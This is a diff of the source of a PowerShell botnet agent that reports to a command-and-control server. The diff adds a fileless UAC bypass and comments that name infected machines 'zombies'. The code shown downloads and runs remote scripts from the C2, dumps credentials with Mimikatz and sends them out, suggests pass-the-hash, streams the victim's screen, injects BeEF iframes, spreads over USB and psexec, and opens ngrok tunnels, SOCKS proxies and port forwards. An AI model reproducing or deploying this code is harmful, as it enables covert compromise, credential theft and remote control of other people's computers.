@@ -62,7 +62,7 @@ $c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("GETC2URL") # R
 if ($keyreadgetC2.length -eq 43) {$keyreadgetC2 = $keyreadgetC2 + '=' }
 if ($keyreadgetC2.length -eq 42) {$keyreadgetC2 = $keyreadgetC2 + '==' }
 [string] $Global:c2c = Decrypt-String "$keyreadgetC2" "$c2cEncrypted" 
-[string] $Global:pc = ""
+[string] $Global:pc = "" # Zombie's ID 
 [string] $Global:upgradeThisPowershell = "UPGRADEPOWERSHELL" # Set if PS upgrade must be attempted once executed
 [string] $Global:scan = "empty" # Set if a scan must be attempted once executed
 [string] $Global:usbspreading = "USBSPREAD" # Set if USB spreading must be automatic
@@ -93,7 +93,17 @@ $y = $ip.split('.')[2]
 $z = $ip.split('.')[3]
 $StartAddress = "$w.$x.$y.1"
 $EndAddress = "$w.$x.$y.254"
+# Check if current shell are executed in priviledged mode
 [string] $Global:IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+$language = Get-WinSystemLocale # Check OS language
+ if ($language.Name -eq "fr-FR"){ $gp = Get-LocalGroupMember -Group Administrateurs } else {$gp = Get-LocalGroupMember -Group Administrators}
+# Check if current session have admins membership (so that bypassUAC ca be used to pop-up elevetad shell 
+$CurrentSession = whoami
+for($i=0; $i -lt $gp.Name.Length; $i++){ $admin_member = $gp.Name.Item($i)
+    if ($admin_member -eq $CurrentSession){ 
+	[string] $Global:IsAdminMember = $true }
+}
+[string] $Global:OSbuild = [System.Environment]::OSVersion.Version.Major
 ######################################################################
 
 # Test PS version and download CurL if the version is lower than 3. Also try to install Choco and update powershell to v3+         ROOT_FOLDER
@@ -271,14 +281,18 @@ iex ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/$runURL"))
 				{$usercredsObject}
 			else {$usercreds }
 		}		
-		function Invk-EvtVwrBypass { # execute command in admin mode with eventviewer bypass technique
-				[CmdletBinding()] param( 
-				[String]$Command,
-				[Switch]$Force
-				)
-				iex ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/Invk-EvtVwrBypass.txt"))
-				ModInvkEvtVwrBypass -Command $Command
-				}   	
+		function Invk-EvtVwrBypass { # execute command in privileged mode with eventviewer bypass UAC technique
+			[CmdletBinding()] param( 
+			[String]$Command,
+			[Switch]$Force
+			)
+			if ($IsAdminMember -eq $True) {iex ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/EvtVwrUacBypass.txt"))
+				if ($OSbuild -lt 10) {
+					Set-FilelessBypassUac -Method mscfile -Option CommandLine -CommandLine $Command
+				}else {
+					Set-FilelessBypassUac -Method ms-settings -Option CommandLine -CommandLine $Command}
+				}   
+			}
 		function TestInternet { # Check internet connexion
 			[CmdletBinding()] 
 			param() 
@@ -454,7 +468,7 @@ Function Invoke-Pnt {
 			$c2c = $NewC2C
 			InitializeBot
 		}
-        Function HelloCommand {
+        Function HelloCommand { # Manual poll C2 to update zombie's status
 			[CmdletBinding()] param( 
 			[string]$id
 			)
@@ -462,7 +476,7 @@ Function Invoke-Pnt {
 			$result = "Hello - $date"
 			sendC2 $pc $result $id
             }
-		Function HelloOnline {
+		Function HelloOnline { # Automate Poll C2 to update zombie's status
 			$pcIdleTime = IdleTimePC
 			$date = Get-Date #-Format MM/dd/yyyy-H:mm:ss | Out-String
 			$result = "Online _ $date _ Admin:$isAdmin _ Idle: $pcIdleTime"
@@ -478,7 +492,7 @@ Function Invoke-Pnt {
 				}
 			} else {
 			Invoke-WebRequest -Uri "$c2c/ROOT_FOLDER/link/online.php" -Method POST -Body $postParams}
-            if ($ScreenstreamActivated -eq "on"){ screencapture	}
+            if ($ScreenstreamActivated -eq "on"){ screencapture	} # stream victim screen if feature have been activated
 			}
 		Function UpdateCommand { # update agent (not the c2, use !changec2 to update c2)
 			[CmdletBinding()] param( 
@@ -532,7 +546,7 @@ Function Invoke-Pnt {
 			[string]$id
 			)
 			$myAgntencoded = $LatestOrder.split('|')[1]
-			$result = "Vector changed"
+			$result = "Encoded Vector changed to: $myAgntencoded"
 			sendC2 $pc $result $id
             }	
 	# Download & Run command > BEGIN
@@ -698,7 +712,8 @@ Interceptor -Tamper -SearchString "</head>" -ReplaceString "<iframe src=beefserv
 			[string]$id
 			)
 			$result = whoami
-			$result += " ---  Admin:$isAdmin "
+			$result += " ---  Admin: $isAdminMember "
+			$result += " ---  Privileged Shell: $isAdmin "
 			sendC2 $pc $result $id
 			}			
 		Function ScanCommand {
@@ -868,7 +883,7 @@ Exfilt "$env:userprofile\AppData\enumshare.txt"
 			)
 			[string] $user = $LatestOrder.split('|')[1]
 			[string] $pass = $LatestOrder.split('|')[2]
-			if ($IsAdmin -eq $True) {
+			if ($IsAdmin -eq $True) { 
 			IEX(New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/SessGopher.txt")
 				if (!$user) {[string]$result = Invoke-SessionGopher -Thorough}
 				else {[string]$result = Invoke-SessionGopher -AllDomain -u $user -p $pass}
@@ -1258,18 +1273,18 @@ PsHttp -BINDING "http://127.0.0.1:80" -REDIRECTTO $Redirect_PhishingURL
 			[CmdletBinding()] param( 
 			[string]$id
 			)
-			IEX (New-Object Net.WebClient).DownloadString("https://is.gd/oeoFuI")
+			IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/mMktZ.txt"))
 			[string] $rs = "" 
-			$rs += Invoke-Mimikatz -Command "privilege::debug" 
+			$rs += mMktZ -Command "privilege::debug" 
 			$rs += "`n`n "
-			$rs += Invoke-Mimikatz -Command "sekurlsa::logonpasswords" 
+			$rs += mMktZ -Command "sekurlsa::logonpasswords" 
 			$rs += "`n`n "
-			$rs += Invoke-Mimikatz -DumpCreds
+			$rs += mMktZ -DumpCreds
 			$rs += "`n`n "
-			$rs += Invoke-Mimikatz -Command "sekurlsa::ekeys" 
-			#Invoke-Mimikatz -Command "log sekurlsa.log"
+			$rs += mMktZ -Command "sekurlsa::ekeys" 
+			# mMktZ  -Command "log sekurlsa.log"
 			$rs += "`n`n  ----------------------------------------- "
-			$rs += "YOU CAN PASS THE HASH with rc4_hmac_nt, rc4_hmac_old ... : Invoke-Mimikatz -Command sekurlsa::pth /user:Administrateur /domain:corporate.local /ntlm:cc36cf7a8514893efccd332446158b1a"
+			$rs += "YOU CAN PASS THE HASH with rc4_hmac_nt, rc4_hmac_old ... : mMktZ -Command sekurlsa::pth /user:Administrateur /domain:corporate.local /ntlm:cc36cf7a8514893efccd332446158b1a"
 			set-content $env:userprofile\AppData\pass.txt -Value $rs
 			exfiltrate $env:userprofile\AppData\pass.txt
 			$result = "ok"
@@ -1436,7 +1451,7 @@ IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/chr-dump.t
 				sendC2 $pc $result $id
 			}
         }
-		Function BypassUacCommand { # !bypassuac|net user toto /add   OR !bypassuac
+		Function BypassUacCommand { # !bypassuac|net user toto /add   OR !bypassuac (to use default pnt base64)
 			[CmdletBinding()] param( 
 			[string]$id
 			)
@@ -1683,7 +1698,7 @@ Invoke-PortFwd -bindPort $bindport -destHost $desthost -destPort $destport ;
 			$result = "Port forwarding ready - bind on $bindport forward to $desthost - $destport"			
 			sendC2 $pc $result $id
 			}
-		Function CovertChannelCommand { # !covertchannel|gmail|http:\\server\config.ini
+		Function C2ChannelCommand { # !c2channel|gmail|http:\\server\config.ini
 		# switch covert canal to : dns, icmp, gmail, twitter or dropbox (a BIG TASK )
 		}
 		Function SetProxyCommand { # !proxy|213.18.200.13|8484 - Set proxy configuration. you can use fiddler here to see HTTPS. or setup your own proxy 
@@ -2381,7 +2396,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/setMacAttri
 				!quit {QuitCommand $id}				  #  !quit   -     Delete all artifacts and clean computer. The end of operations
                 !hello {HelloCommand $id}			  #  !hello
                 !changec2 {ChangeC2Command $id}		  #  !changec2|http:\newc2cserver.com
-				!vector {EncodedVectorCommand $id}	  #  !vector|SBOFSBOFSBOF==
+				!vector {EncodedVectorCommand $id}	  #  !vector|SBOFSBOFSBOF== Change the encoded string of payload vector
 				!beef {BeefCommand $id}               #  !beef|iexplore.exe|http://192.168.3.40:3000/demos/basic.html   Param 2 can be: firefox.exe/ opera.exe/ chrome.exe/ iexplore.exe
                 !choco {ChocoInstallCommand $id}      #  !choco  - install Choco and some usefull plug
 				!aptget {AptGetCommand $id}           # !aptget|php OR !aptget|python2 OR !aptget|curl OR !aptget|wget - install package with linux style using CHOCOLATEY. You must first run !choco
@@ -2428,6 +2443,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/setMacAttri
 				!ngrok {NgrokTunnelCommand $id} 	  #  !ngrok|authkey|http|80     - Expose zombie(TCP/IP) PC to Internet so that you can connect any tools
 				!socks {SocksProxyCommand $id} 		  #	 !socks|1234 - Create a Socks 4/5 proxy on port 1234
 				!portfwd {PortFwdCommand $id} 		  #  !portfwd|33389|127.0.0.1|3389 -- Create a simple tcp port forward. liste localy on 33389 and forward to local 3389			
+				!c2channel {ChannelCommand $id} 	  #  !c2channel|gmail|http:\\server\config.ini - change c2 channel (Covert channel : http, onedrive, gdrive, dropbox ...)
 				!proxy {SetProxyCommand $id}          #  !proxy|213.18.200.13|8484 - Set proxy configuration. you can use fiddler here to see HTTPS. or setup your own proxy 
 				#!uaclevel {SetUACLevelCommand $id}   #  !uaclevel|on    ou   uaclevel|off
 				!psexec {PsexecCommand $id}    	  	  #  !psexec|domain\admin|password|192.168.3.202|powershell.exe 'calc.exe'    - download psexec, use credential and push bot in targeted ip 
